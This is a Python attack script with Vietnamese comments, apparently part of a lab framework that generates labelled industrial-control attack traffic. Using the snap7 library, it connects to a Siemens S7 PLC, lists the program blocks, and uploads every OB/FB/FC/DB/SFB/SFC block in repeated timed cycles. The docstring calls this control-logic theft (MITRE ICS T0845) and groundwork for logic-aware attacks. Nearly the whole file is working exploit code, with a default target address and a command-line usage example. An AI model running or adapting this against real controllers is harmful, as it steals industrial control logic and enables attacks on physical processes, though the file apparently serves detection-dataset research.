"""
PROGRAM_UPLOAD_THEFT
Đánh cắp logic điều khiển của PLC: liệt kê rồi upload các khối chương trình
OB/FB/FC/DB/SFB/SFC qua S7 (snap7). Khác hẳn read/write_area (chỉ đọc/ghi
Ô NHỚ giá trị) — đây là hút TOÀN BỘ mã điều khiển (IP theft / logic recon),
tiền đề cho tấn công có nhận thức về logic.

MITRE ICS: T0845 (Program Upload).

Chữ ký trên wire: hàm S7 Upload (start/upload/end) + truyền khối dung lượng
lớn từ PLC -> attacker, khác biệt rõ với burst read/write.

Kết quả (giống Day 8): mỗi khối upload được => bằng chứng "đánh cắp thành công";
bị PLC từ chối (protection level) => "upload_denied" (vẫn là dữ liệu hợp lệ,
cho biết PLC có tự bảo vệ hay không).

Gọi từ bash:
  python -m attacks_ext.program_upload \
      --target 192.168.210.211 --rack 0 --slot 1 --duration 120 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import time
import random

import snap7
try:
    from snap7.type import Block
except ImportError:          # snap7 cũ
    from snap7.types import Block

from attacks_ext.config_ext import base_parser, write_label

# Các loại khối chương trình muốn hút. SDB (system data block) bỏ qua để tránh
# đụng cấu hình hệ thống; tập trung vào logic người dùng.
BLOCK_TYPES = [Block.OB, Block.FB, Block.FC, Block.DB, Block.SFB, Block.SFC]
MAX_PER_TYPE = 128


def enumerate_blocks(client) -> str:
    """Liệt kê số lượng khối mỗi loại (recon nhẹ, không tải nội dung)."""
    try:
        bl = client.list_blocks()
        parts = []
        for attr in ("OBCount", "FBCount", "FCCount", "DBCount", "SFBCount", "SFCCount", "SDBCount"):
            v = getattr(bl, attr, None)
            if v:
                parts.append(f"{attr[:-5]}={v}")
        return " ".join(parts) if parts else "no_blocks_listed"
    except Exception as exc:
        return f"list_blocks_err={type(exc).__name__}"


def steal_cycle(client):
    """Một vòng: với mỗi loại khối, list số hiệu rồi full_upload từng khối.
    Trả về (số khối lấy được, tổng byte, số khối bị từ chối, ghi chú mẫu)."""
    got, byts, denied = 0, 0, 0
    sample = []
    for bt in BLOCK_TYPES:
        try:
            nums = client.list_blocks_of_type(bt, MAX_PER_TYPE)
        except Exception:
            continue
        for num in list(nums)[:MAX_PER_TYPE]:
            try:
                data, size = client.full_upload(bt, int(num))
                got += 1
                byts += int(size)
                if len(sample) < 6:
                    sample.append(f"{bt.name}{num}:UPLOAD_SUCCESS({size}B)")
            except Exception as exc:
                denied += 1
                if len(sample) < 6:
                    sample.append(f"{bt.name}{num}:upload_denied={type(exc).__name__}")
            time.sleep(random.uniform(0.05, 0.15))
    return got, byts, denied, sample


def run(args):
    label_prefix = "PROGRAM_UPLOAD_THEFT"
    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s target={args.target}")

    client = snap7.client.Client()
    total_got, total_bytes, total_denied = 0, 0, 0
    first_note = ""
    try:
        client.connect(args.target, args.rack, args.slot)
        print(f"[*] PROGRAM_UPLOAD_THEFT -> {args.target}  ({enumerate_blocks(client)})")
        end_time = time.time() + args.duration
        cycle = 0
        while time.time() < end_time:
            cycle += 1
            got, byts, denied, sample = steal_cycle(client)
            total_got += got
            total_bytes += byts
            total_denied += denied
            if not first_note and sample:
                first_note = " | ".join(sample)
            print(f"  [cycle {cycle}] uploaded={got} blk ({byts}B), denied={denied}")
            time.sleep(random.uniform(3, 8))
    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        try:
            client.disconnect()
        except Exception:
            pass
        verdict = "VULNERABLE_logic_stolen" if total_got else "protected_all_denied"
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"blocks_stolen={total_got} bytes={total_bytes} denied={total_denied} "
                         f"verdict={verdict} sample=[{first_note}]")


def main():
    p = base_parser("PROGRAM_UPLOAD_THEFT — steal PLC control logic via S7 upload (T0845)")
    p.add_argument("--target", default="192.168.210.211")
    p.add_argument("--rack", type=int, default=0)
    p.add_argument("--slot", type=int, default=1)
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
